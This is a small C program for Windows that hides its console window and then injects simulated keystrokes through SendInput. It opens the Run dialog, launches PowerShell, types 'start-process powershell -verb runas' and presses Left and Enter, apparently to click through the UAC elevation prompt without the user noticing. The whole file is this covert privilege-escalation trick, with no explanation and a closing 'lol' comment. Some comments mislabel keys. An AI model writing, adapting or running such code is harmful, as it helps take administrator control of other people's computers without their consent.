#include <windows.h>
#include <stdio.h>
 void Hide(int i)
 {
      if(i == 1)
     {
    HWND stealth;
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
     }
     else return;
}

void ez_key(WORD key,WORD key1){
    Sleep(500);
    INPUT kinput[4] = {}; // key/s
    ZeroMemory(kinput, sizeof(kinput));
    kinput[0].type = INPUT_KEYBOARD;
    kinput[0].ki.wVk = key;
    kinput[1].type = INPUT_KEYBOARD;
    kinput[1].ki.wVk = key1;
    kinput[2].type = INPUT_KEYBOARD;
    kinput[2].ki.wVk = key1;
    kinput[2].ki.dwFlags = KEYEVENTF_KEYUP;
    kinput[3].type = INPUT_KEYBOARD;
    kinput[3].ki.wVk = key;
    kinput[3].ki.dwFlags = KEYEVENTF_KEYUP;
    UINT uSent = SendInput(ARRAYSIZE(kinput), kinput, sizeof(INPUT));
}
void ez_onekey(WORD key){
    Sleep(500);
    INPUT kinput[2] = {}; // key/s
    ZeroMemory(kinput, sizeof(kinput));
    kinput[0].type = INPUT_KEYBOARD;
    kinput[0].ki.wVk = key;
    kinput[1].type = INPUT_KEYBOARD;
    kinput[1].ki.wVk = key;
    kinput[1].ki.dwFlags = KEYEVENTF_KEYUP;
    UINT uSent = SendInput(ARRAYSIZE(kinput), kinput, sizeof(INPUT));
}

int main(){
    Hide(1);
    ez_key(VK_LWIN,0x44); // win + d
    ez_key(VK_LWIN,0x52); // win + r
    ez_onekey(0x50); // p
    ez_onekey(0x4f); // o
    ez_onekey(0x57); // w
    ez_onekey(0x45); // e
    ez_onekey(0x52); // r
    ez_onekey(0x53); // s
    ez_onekey(0x48); // h
    ez_onekey(0x45); // e
    ez_onekey(0x4C); // l
    ez_onekey(0x4C); // l
    ez_key(VK_RETURN,VK_RETURN); 

//start-process powershell -verb runas
    ez_onekey(0x53); // s
    ez_onekey(0x54); // t 
    ez_onekey(0x41); // a 
    ez_onekey(0x52); // r
    ez_onekey(0x54); // t 
    ez_onekey(VK_SUBTRACT); // -
    ez_onekey(0x50); // p
    ez_onekey(0x52); // r
    ez_onekey(0x4f); // o
    ez_onekey(0x43); // c
    ez_onekey(0x45); // e
    ez_onekey(0x53); // s
    ez_onekey(0x53); // s
    ez_onekey(VK_SPACE); // t 
    ez_onekey(0x50); // p
    ez_onekey(0x4f); // o
    ez_onekey(0x57); // w
    ez_onekey(0x45); // e
    ez_onekey(0x52); // r
    ez_onekey(0x53); // s
    ez_onekey(0x48); // h
    ez_onekey(0x45); // e
    ez_onekey(0x4C); // l
    ez_onekey(0x4C); // l
    ez_onekey(VK_SPACE); 
    ez_onekey(VK_SUBTRACT); // -
    ez_onekey(0x56); // v
    ez_onekey(0x45); // e
    ez_onekey(0x52); // r
    ez_onekey(0x42); // b
    ez_onekey(VK_SPACE); 
    ez_onekey(0x52); // r
    ez_onekey(0x55); // u
    ez_onekey(0x4e); // n
    ez_onekey(0x41); // a 
    ez_onekey(0x53); // s
    ez_onekey(VK_RETURN); 
    ez_onekey(VK_LEFT); // s
    ez_onekey(VK_RETURN); 
    // lol



}